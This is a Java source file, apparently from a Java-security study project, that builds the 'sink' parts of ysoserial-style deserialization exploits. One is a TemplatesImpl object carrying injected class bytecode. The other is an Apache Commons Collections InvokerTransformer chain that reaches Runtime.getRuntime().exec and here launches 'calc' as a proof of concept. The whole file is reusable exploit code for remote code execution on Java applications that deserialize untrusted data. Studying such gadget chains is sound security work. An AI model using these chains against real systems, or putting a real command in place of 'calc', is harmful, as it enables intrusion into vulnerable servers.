package com.pacemrc.javasec.deserialize.ysoserial;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import static com.pacemrc.javasec.classload.classloadDemo.setFieldValue;


public class Sinks {

    public static TemplatesImpl getTemplatesImplSink() throws Exception {
        JavaClass javaClass = Repository.lookupClass(Calc.class);
        byte[] code = javaClass.getBytes();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","aaa");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][] { code });

        return templates;
    }

    public static Transformer[] getTransformerArraySink() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        return transformers;
    }
}
